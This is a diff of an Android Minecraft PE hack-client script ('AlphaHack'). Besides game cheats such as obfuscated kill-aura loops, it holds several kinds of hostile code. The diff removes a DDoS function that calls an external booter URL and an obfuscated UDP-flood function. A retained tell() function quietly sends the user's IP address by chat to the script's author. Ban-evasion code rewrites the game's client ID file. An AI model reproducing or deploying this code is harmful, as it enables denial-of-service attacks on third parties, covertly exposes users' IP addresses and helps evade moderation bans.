@@ -8220,12 +9533,18 @@ if(GetLang=="de_DE")source.setText('Mod Gruppe');
 if(GetLang=="ko_KR")source.setText('모드 커뮤니티');
 
 if(GetLang=="es_MX")source.setText('Comunidad de mods');
+
+if(GetLang=="ja_JP")source.setText('Modコミュニテ ');
+
+if(GetLang=="fr_FR")source.setText('Mod Communauté');
+
+if(GetLang=="it_IT")source.setText('Mod Della Comunità');
 source.setTextColor(GUIBtns);
             source.setOnClickListener(new View.OnClickListener({
                 onClick: function(viewarg){
 arceusMatt(); 
 showMenuBtn();
-print("Loading web page");
+Toast.makeText(ctx, "AlphaHack: Loading web page", 1).show();
                 }
             }));
             menuLayout.addView(source);
@@ -8240,14 +9559,19 @@ function arceusMatt()
       webset.setJavaScriptEnabled(true);
       webs.setWebChromeClient(new android.webkit.WebChromeClient());
       webs.setWebViewClient(new android.webkit.WebViewClient());
-      webs.loadUrl('https://plus.google.com/communities/103695355587842948163');
+      webs.loadUrl('http://alphahackpe.weebly.com');
 /*Site URL*/
       new android.app.AlertDialog.Builder(ctx).setView(webs).show();
       }}));
       }
 
 menu = new PopupWindow(menuLayout1, ctx.getWindowManager().getDefaultDisplay().getWidth()/GUISize, ctx.getWindowManager().getDefaultDisplay().getHeight());
-            menu.setBackgroundDrawable(new ColorDrawable(GUIColor));
+           menu.setBackgroundDrawable(new ColorDrawable(GUIColor));
+		   var bg = new android.graphics.drawable.GradientDrawable();
+      bg.setColor(GUIColor);
+      bg.setStroke(10,Color.BLUE);
+menuLayout1.setBackgroundDrawable(bg);
+menuLayout1.setPadding(20,0,20,0);
             menu.showAtLocation(ctx.getWindow().getDecorView(), GUIPos | Gravity.TOP, 0, 0);
             }catch(error){
                 Toast.makeText(ctx, "An error occured: " + error, 1).show();
@@ -8294,7 +9618,7 @@ exitb.setTextColor(Color.RED);
 
 header.dismiss(); 
 
-print("Closed successfully");
+Toast.makeText(ctx, "Closed successfully", 1).show();
 
 showMenuBtn();
                 }
@@ -8317,6 +9641,8 @@ header.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
 var _0x534d=["\x67\x65\x74\x41\x6C\x6C","\x6C\x65\x6E\x67\x74\x68","\x67\x65\x74\x58","\x67\x65\x74\x59","\x67\x65\x74\x5A","\x67\x65\x74\x45\x6E\x74\x69\x74\x79\x54\x79\x70\x65\x49\x64","\x73\x65\x74\x48\x65\x61\x6C\x74\x68"];function killing(){var _0xf254x2=Entity[_0x534d[0]]();for(var _0xf254x3=0;_0xf254x3<_0xf254x2[_0x534d[1]];_0xf254x3++){var _0xf254x4=Entity[_0x534d[2]](_0xf254x2[_0xf254x3])-getPlayerX();var _0xf254x5=Entity[_0x534d[3]](_0xf254x2[_0xf254x3])-getPlayerY();var _0xf254x6=Entity[_0x534d[4]](_0xf254x2[_0xf254x3])-getPlayerZ();if(_0xf254x4*_0xf254x4+_0xf254x5*_0xf254x5+_0xf254x6*_0xf254x6<=20*20&&_0xf254x2[_0xf254x3]!=getPlayerEnt()){if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==10){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==11){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==12){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==13){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==14){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==15){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==16){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==17){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==18){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==19){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==20){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==21){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==22){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==32){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==33){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==34){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==35){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==36){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==37){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==38){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==39){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==40){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==41){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==42){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==43){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==44){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)};if(Entity[_0x534d[5]](_0xf254x2[_0xf254x3])==45){Entity[_0x534d[6]](_0xf254x2[_0xf254x3],0)}}}}
 
 var _0x1b58=["\x67\x65\x74\x41\x6C\x6C","\x6C\x65\x6E\x67\x74\x68","\x67\x65\x74\x58","\x67\x65\x74\x59","\x67\x65\x74\x5A","\x67\x65\x74\x45\x6E\x74\x69\x74\x79\x54\x79\x70\x65\x49\x64","\x73\x65\x74\x49\x6D\x6D\x6F\x62\x69\x6C\x65"];function killingf(){var _0x2d95x2=Entity[_0x1b58[0]]();var _0x2d95x3=true;if(killfaura==false){_0x2d95x3=false};for(var _0x2d95x4=0;_0x2d95x4<_0x2d95x2[_0x1b58[1]];_0x2d95x4++){var _0x2d95x5=_0x2d95x2[_0x2d95x4];var _0x2d95x6=Entity[_0x1b58[2]](_0x2d95x2[_0x2d95x4])-getPlayerX();var _0x2d95x7=Entity[_0x1b58[3]](_0x2d95x2[_0x2d95x4])-getPlayerY();var _0x2d95x8=Entity[_0x1b58[4]](_0x2d95x2[_0x2d95x4])-getPlayerZ();if(_0x2d95x6*_0x2d95x6+_0x2d95x7*_0x2d95x7+_0x2d95x8*_0x2d95x8<=20*20&&_0x2d95x2[_0x2d95x4]!=getPlayerEnt()){if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==10){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==11){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==12){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==13){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==14){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==15){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==16){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==17){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==18){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==19){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==20){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==21){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==22){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==32){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==33){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==34){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==35){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==36){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==37){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==38){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==39){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==40){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==41){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==42){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==43){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==44){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)};if(Entity[_0x1b58[5]](_0x2d95x2[_0x2d95x4])==45){Entity[_0x1b58[6]](_0x2d95x5,_0x2d95x3)}}}}
+
+var _0xa175=["\x67\x65\x74\x41\x6C\x6C","\x6C\x65\x6E\x67\x74\x68","\x67\x65\x74\x58","\x67\x65\x74\x59","\x67\x65\x74\x5A","\x67\x65\x74\x45\x6E\x74\x69\x74\x79\x54\x79\x70\x65\x49\x64","\x73\x65\x74\x46\x69\x72\x65\x54\x69\x63\x6B\x73"];function killingd(){var _0x2e83x2=Entity[_0xa175[0]]();for(var _0x2e83x3=0;_0x2e83x3<_0x2e83x2[_0xa175[1]];_0x2e83x3++){var _0x2e83x4=Entity[_0xa175[2]](_0x2e83x2[_0x2e83x3])-getPlayerX();var _0x2e83x5=Entity[_0xa175[3]](_0x2e83x2[_0x2e83x3])-getPlayerY();var _0x2e83x6=Entity[_0xa175[4]](_0x2e83x2[_0x2e83x3])-getPlayerZ();if(_0x2e83x4*_0x2e83x4+_0x2e83x5*_0x2e83x5+_0x2e83x6*_0x2e83x6<=20*20&&_0x2e83x2[_0x2e83x3]!=getPlayerEnt()){if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==10){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==11){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==12){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==13){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==14){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==15){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==16){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==17){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==18){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==19){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==20){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==21){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==22){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==32){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==33){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==34){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==35){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==36){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==37){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==38){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==39){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==40){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==41){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==42){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==43){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==44){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)};if(Entity[_0xa175[5]](_0x2e83x2[_0x2e83x3])==45){Entity[_0xa175[6]](_0x2e83x2[_0x2e83x3],5)}}}}
 
 /***********************/
 
@@ -8410,7 +9736,7 @@ fov.setHeight(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
 fov.setWidth(android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
 fov.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.TOP, 0, 0);
 } catch (e){
-print("The signer Dialog Is Malfunctioning:"+e);
+print("The fov Dialog Is Malfunctioning:"+e);
 }
 }});
 }
@@ -8460,32 +9786,96 @@ print("The signer Dialog Is Malfunctioning:"+e);
 }});
 }
 
-function ddoss(target, port, time)
-{
+function mobStat() {
+	 	 	 var entit = Entity.getAll();
 
-  var xhr = new XMLHttpRequest();
-
-  xhr.open("GET", "http://applqpak.x10.mx/index.php?target=" + target + "&port=" + port + "&time=" + time, true);
-
-  xhr.send();
-
- print("Attack Sent!");
-
- xhr.onreadystatechange = function()
-  {
-
-    if(xhr.readyState == 4 && xhr.status == 200)
-    {
-
-      print("Attack Finished!");
-
-    }
-
-  }
-
-}
-
-var _0x56f5=["\x6E\x65\x74","\x55\x54\x46\x38","\x67\x65\x74\x42\x79\x74\x65\x73","","\x6C\x65\x6E\x67\x74\x68","\x67\x65\x74\x42\x79\x4E\x61\x6D\x65","\x49\x6E\x65\x74\x41\x64\x64\x72\x65\x73\x73","\x73\x65\x6E\x64","\x63\x6C\x6F\x73\x65","\x6C\x61\x6E\x67","\x73\x74\x61\x72\x74"];function ddos(_0xb446x2,_0xb446x3,_0xb446x4){var _0xb446x5= new java[_0x56f5[9]].Runnable({run:function(){try{for(var _0xb446x6=0;_0xb446x6<=_0xb446x4;_0xb446x6++){var _0xb446x7= new java[_0x56f5[0]].DatagramSocket();var _0xb446x8= new byte[2024];_0xb446x8=_0x56f5[3].toString()[_0x56f5[2]](_0x56f5[1]);_0xb446x7[_0x56f5[7]]( new java[_0x56f5[0]].DatagramPacket(_0xb446x8,_0xb446x8[_0x56f5[4]],java[_0x56f5[0]][_0x56f5[6]][_0x56f5[5]](_0xb446x2),_0xb446x3));_0xb446x7[_0x56f5[8]]()}}catch(e){print(e)}}});var _0xb446x9= new java[_0x56f5[9]].Thread(_0xb446x5);_0xb446x9[_0x56f5[10]]()}
+    for(var i = 0; i < entit.length; i++) {
+	 if(Entity.getEntityTypeId(entit[i]) == 10){
+	Entity.setNameTag(entit[i], "§7Chicken " + "§c" + Entity.getHealth(entit[i]) +" | 4 ❤");
+	}
+            if(Entity.getEntityTypeId(entit[i]) == 11){
+                Entity.setNameTag(entit[i], "§7Cow " + "§c" + Entity.getHealth(entit[i]) + " | 10 ❤"); 
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 12){
+                Entity.setNameTag(entit[i], "§7Pig " + "§c" + Entity.getHealth(entit[i]) + " | 10 ❤"); 
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 13){
+                Entity.setNameTag(entit[i], "§7Sheep " + "§c" + Entity.getHealth(entit[i]) + " | 8 ❤"); 
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 14){
+                Entity.setNameTag(entit[i], "§7Wolf " + "§c" + Entity.getHealth(entit[i]) + " | 8 ❤"); 
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 15){
+                Entity.setNameTag(entit[i], "§7Villager " + "§c" + Entity.getHealth(entit[i]) + " | 20 ❤"); 
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 16){
+               Entity.setNameTag(entit[i], "§7Cow 2 " + "§c" + Entity.getHealth(entit[i]) + " | 10 ❤"); 
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 17){
+                Entity.setNameTag(entit[i], "§7Squid " + "§c" + Entity.getHealth(entit[i]) + " | 10 ❤"); 
+            }
+if(Entity.getEntityTypeId(entit[i]) == 18) {
+                Entity.setNameTag(entit[i], "§7Rabbit " + "§c" + Entity.getHealth(entit[i]) + " | 10 ❤"); 
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 19){
+                Entity.setNameTag(entit[i],  "§7Bat " + "§c" + Entity.getHealth(entit[i]) + " | 6 ❤"); 
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 20){
+                Entity.setNameTag(entit[i], "§7Iron Golem " + "§c" + Entity.getHealth(entit[i]) + " | 100 ❤"); 
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 21){
+                Entity.setNameTag(entit[i], "§7Snow Golem " + "§c" + Entity.getHealth(entit[i]) + " | 10 ❤"); 
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 22){
+                Entity.setNameTag(entit[i], "§7Ocelot " + "§c" + Entity.getHealth(entit[i]) + " | 10 ❤"); 
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 32){
+                Entity.setNameTag(entit[i], "§7Zombie " + "§c" + Entity.getHealth(entit[i]) + " | 20 ❤"); 
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 33){
+                Entity.setNameTag(entit[i], "§7Creeper " + "§c" + Entity.getHealth(entit[i]) + " | 20 ❤"); 
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 34){
+                Entity.setNameTag(entit[i], "§7Skeleton " + "§c" + Entity.getHealth(entit[i]) + " | 20 ❤"); 
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 35){
+                Entity.setNameTag(entit[i], "§7Spider " + "§c" + Entity.getHealth(entit[i]) + " | 16 ❤"); 
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 36){
+                Entity.setNameTag(entit[i], "§7Zombie Pigman " + "§c" + Entity.getHealth(entit[i]) + " | 20 ❤"); 
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 37){
+                Entity.setNameTag(entit[i], "§7Slime " + "§c" + Entity.getHealth(entit[i]) + " | 16 ❤"); 
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 38){
+                Entity.setNameTag(entit[i], "§7Enderman " + "§c" + Entity.getHealth(entit[i]) + " | 40 ❤"); 
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 39){
+                Entity.setNameTag(entit[i], "§7Silverfish " + "§c" + Entity.getHealth(entit[i]) + " | 8 ❤");
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 40){
+                Entity.setNameTag(entit[i], "§7Cave Spider " + "§c" + Entity.getHealth(entit[i]) + " | 12 ❤");
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 41){
+                Entity.setNameTag(entit[i], "§7Ghast " + "§c" + Entity.getHealth(entit[i]) + " | 10 ❤");
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 42){
+                Entity.setNameTag(entit[i], "§7Magma Cube " + "§c" + Entity.getHealth(entit[i]) + " | 16 ❤");
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 43){
+                Entity.setNameTag(entit[i], "§7Blaze " + "§c" + Entity.getHealth(entit[i]) + " | 20 ❤");
+            }
+if(Entity.getEntityTypeId(entit[i]) == 44) {
+                Entity.setNameTag(entit[i], "§7Zombie Villager " + "§c" + Entity.getHealth(entit[i]) + " | 20 ❤");
+            }
+if(Entity.getEntityTypeId(entit[i]) == 45) {
+                Entity.setNameTag(entit[i], "§7Witch " + "§c" + Entity.getHealth(entit[i]) + " | 26 ❤");
+            }
+            if(Entity.getEntityTypeId(entit[i]) == 100) {
+                Entity.setNameTag(entit[i], "§7Horse " + "§c" + Entity.getHealth(entit[i]) + " | null ❤");
+            }
+	 }
+	 }
 
 /***********************/
 
@@ -8496,7 +9886,6 @@ net.zhuoweizhang.mcpelauncher.ScriptManager.nativeForceCrash();
 }
 
 function tell(){
-var chat = net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat;
 
 getIp(function(info){chat("/tell Arceus_matt using AlphaHack! ip " + info[0])})
 }
@@ -8531,6 +9920,16 @@ if(instabreak==false)
 	}
 }
 
+function destroyBlock(x, y, z, side)
+{
+if(block == true)preventDefault();
+}
+
+function startDestroyBlock(x, y, z, side)
+{
+if(block == true)preventDefault()
+}
+
 function useItem(x, y, z, itemId, blockId, side){
 if(deadchat)if(blockId == 63 || blockId == 68)signEditor(); 
 
@@ -8547,17 +9946,27 @@ Level.spawnMob(x, y +1, z, EntityType.ARROW);
 Level.spawnMob(x, y +1, z, EntityType.EXPERIENCE_ORB);
 	}
 	if(minecart) {
-Level.spawnMob(x, y +2, z, EntityType.MINECART);
+Level.spawnMob(x, y +2, z, EntityType.PLAYER);
 	}
 
 if(tspam)net.zhuoweizhang.mcpelauncher.ScriptManager.nativeSendChat(text);
 
+if(block == true)preventDefault();
+
+if(tapdd){
+	Level.destroyBlock(x +1, y, z +1, vidd);
+	Level.destroyBlock(x +2, y, z +2, vidd);
+	Level.destroyBlock(x +3, y, z +3, vidd);
+	Level.destroyBlock(x +4, y, z +4, vidd);
+	
+    Level.destroyBlock(x, y, z, vidd);
+
+	Level.destroyBlock(x -1, y, z -1, vidd);
+	Level.destroyBlock(x -2, y, z -2, vidd);
+	Level.destroyBlock(x -3, y, z -3, vidd);
+	Level.destroyBlock(x -4, y, z -4, vidd);
 }
 
-function gameLoop(){
-    var thisLoop = new Date;
-    fps = 1000 / (thisLoop - lastLoop);
-    lastLoop = thisLoop;
 }
 
 /***********************/
@@ -8565,10 +9974,12 @@ function gameLoop(){
 //ModTick
 
 function modTick() {
-if(showp){
-gameLoop();
-}
-if(stackheart){
+	ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){
+	if(stat22){
+		Toast.makeText(ctx, "X: " + Math.round(nx) + ", Y: " + Math.round(ny) + ", Z: " + Math.round(nz) + ". " + "\n" + "G: " + Level.getGameMode() + "." + " T: " + Level.getTime() + "." + " W/L: " + Math.round(Level.getRainLevel()) + "/" + Math.round(Level.getLightningLevel()) + ". " + "ID: " + Player.getCarriedItem() + ":" + Player.getCarriedItemData() + "." + "\n" + Player.getName(Player.getEntity()) + " | " + "B: " + Level.getBiomeName() + "." + " v" + ModPE.getMinecraftVersion(), 2).show();
+	}
+	if(stackheart){
 Player.setHealth(20);
 }
 if(infhun){
@@ -8584,6 +9995,10 @@ if(killfaura){
 
 killingf(); 
 
+}
+if(killdaura) {
+	
+	killingd();
 }
 if(particle1)Level.addParticle(ParticleType.angryVillager, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 5);
 if(particle2)Level.addParticle(ParticleType.bubble, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
@@ -8613,11 +10028,56 @@ if(particle26)Level.addParticle(ParticleType.splash, getPlayerX(), getPlayerY(),
 if(particle27)Level.addParticle(ParticleType.suspendedTown, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
 if(particle28)Level.addParticle(ParticleType.terrain, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
 if(particle29)Level.addParticle(ParticleType.waterWake, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle30)Level.addParticle(ParticleType.largeexplode, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle31)Level.addParticle(ParticleType.spell2, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
+if(particle32)Level.addParticle(ParticleType.spell3, getPlayerX(), getPlayerY(), getPlayerZ(), 0, 0, 0, 150);
 
+if(onlynight)Level.setTime(15000);
+
+if(onlyday)Level.setTime(0);
+
+if(somd){
+	
+mobStat();
+	
+}
+
+if(ban)print("You are banned from AlphaHackPE.")
+
+//This bow code will be changed in the next few updates
+if (getCarriedItem()==1003) {
+bows--;
+if (bows==5) {
+var pitch = ((Entity.getPitch(getPlayerEnt())+90)*Math.PI)/180
+var yaw = ((Entity.getYaw(getPlayerEnt())+90)*Math.PI)/180
+var velX = Math.sin(pitch)*Math.cos(yaw)
+var velY = Math.sin(pitch)*Math.sin(yaw)
+var velZ = Math.cos(pitch)
+arrows = Level.spawnMob(Player.getX() + velX,Player.getY() + velZ,Player.getZ() + velY,80)
+setVelX(arrows, 4*velX)
+setVelY(arrows, 4*velZ)
+setVelZ(arrows, 4*velY)	
+bows = 10		 } }
+
+}});
+}
+
+function serverMessageReceiveHook(str) {
+	ctx.runOnUiThread(new java.lang.Runnable(){
+run: function(){
+	if(ttot)Toast.makeText(ctx, str, 1).show();
+	}});
 }
 
 function devpardon() {
-        var file = new java.io.File( android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/minecraftpe/clientId.txt/");
+	for(var d = 0; d < 6; d++) {
+	print("AlphaHack: Crashing & Unbanning... %" + d + "/5");
+if(d==5)dopardon(); 
+	}
+}
+
+function dopardon(){
+	    var file = new java.io.File( android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/minecraftpe/clientId.txt/");
         var path=android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/minecraftpe/clientId.txt/" ; 
         java.io.File(path).mkdirs(); 
         file.createNewFile();
@@ -8625,16 +10085,15 @@ function devpardon() {
         var string="";
         write.append((Math.floor(Math.random() * (500000 - 100000 + 1)) + 100000));
         write.close();
-         
-    }
+}
 
 /***********************/
 
-//set home java
+//AlphaHackPE Folder, i kept it open so you see what i edit on your device
 
 function save() {
-        var file = new java.io.File( android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/AlphaHack/"+Level.getWorldDir()+"/homes/", "Home "+name+".txt");
-        var path=android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/games/com.mojang/AlphaHack/"+Level.getWorldDir()+"/homes/" ; 
+        var file = new java.io.File( android.os.Environment.getExternalStorageDirectory().getAbsolutePath()+"/AlphaHackPE/homes/", "home " + Level.getWorldDir() + ".txt/");
